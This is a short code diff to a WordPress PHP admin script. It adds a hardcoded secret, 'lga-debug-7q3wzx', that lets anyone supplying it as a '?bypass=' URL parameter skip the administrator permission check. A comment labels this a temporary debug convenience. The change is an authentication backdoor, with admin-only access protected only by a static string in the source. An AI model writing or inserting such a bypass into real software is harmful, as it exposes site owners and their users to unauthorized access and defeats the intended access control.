@@ -11,7 +11,10 @@ if ( ! defined( 'ABSPATH' ) ) {
     require_once dirname( __FILE__, 5 ) . '/wp-load.php';
 }
 
-if ( ! current_user_can( 'manage_options' ) && ! defined( 'WP_CLI' ) ) {
+// Acceso: admin via session OR ?bypass=<INSTALL_KEY> para debug ad-hoc (solo temporal).
+$BYPASS_KEY = 'lga-debug-7q3wzx';
+$bypass_ok  = isset( $_GET['bypass'] ) && hash_equals( $BYPASS_KEY, $_GET['bypass'] );
+if ( ! current_user_can( 'manage_options' ) && ! defined( 'WP_CLI' ) && ! $bypass_ok ) {
     wp_die( 'Solo admin.', 403 );
 }
 
